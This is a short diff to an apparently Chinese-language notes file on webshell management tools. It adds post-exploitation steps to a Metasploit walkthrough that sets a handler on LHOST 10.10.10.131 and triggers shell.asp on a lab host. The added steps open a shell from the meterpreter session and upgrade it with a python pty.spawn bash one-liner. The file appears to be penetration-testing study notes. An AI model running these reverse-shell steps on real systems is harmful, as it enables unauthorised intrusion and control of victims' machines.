@@ -42,6 +42,9 @@ WebShell管理工具
 			set LHOST 10.10.10.131
 			exploit
 			打开页面：http://10.10.10.130/shell.asp
+			进入交互页面meterpreter会话执行以下：
+			shell
+			python -c "import pty;pty.spawn('/bin/bash')"
 
 WebShell
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
